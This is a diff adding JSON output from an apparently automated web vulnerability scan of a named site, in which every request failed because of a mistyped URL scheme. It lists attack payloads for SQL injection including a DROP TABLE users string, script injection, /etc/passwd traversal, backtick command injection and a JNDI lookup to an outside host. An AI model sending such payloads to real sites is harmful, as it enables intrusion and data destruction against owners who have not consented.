@@ -1,0 +1,38 @@
+{
+    "target": "hhtps://shraddhanetralaya.com",
+    "method": "GET",
+    "waf": {
+        "server_header": "Error",
+        "possible_waf": false
+    },
+    "results": [
+        {
+            "payload": "' OR '1'='1",
+            "error": "No connection adapters were found for \"hhtps://shraddhanetralaya.com?input=' OR '1'='1\""
+        },
+        {
+            "payload": "'; DROP TABLE users;--",
+            "error": "No connection adapters were found for \"hhtps://shraddhanetralaya.com?input='; DROP TABLE users;--\""
+        },
+        {
+            "payload": "<script>alert('XSS')</script>",
+            "error": "No connection adapters were found for \"hhtps://shraddhanetralaya.com?input=<script>alert('XSS')</script>\""
+        },
+        {
+            "payload": "../../etc/passwd",
+            "error": "No connection adapters were found for 'hhtps://shraddhanetralaya.com?input=../../etc/passwd'"
+        },
+        {
+            "payload": "`ls`",
+            "error": "No connection adapters were found for 'hhtps://shraddhanetralaya.com?input=`ls`'"
+        },
+        {
+            "payload": "${jndi:ldap://example.com/a}",
+            "error": "No connection adapters were found for 'hhtps://shraddhanetralaya.com?input=${jndi:ldap://example.com/a}'"
+        },
+        {
+            "payload": "%2e%2e%2f",
+            "error": "No connection adapters were found for 'hhtps://shraddhanetralaya.com?input=%2e%2e%2f'"
+        }
+    ]
+}
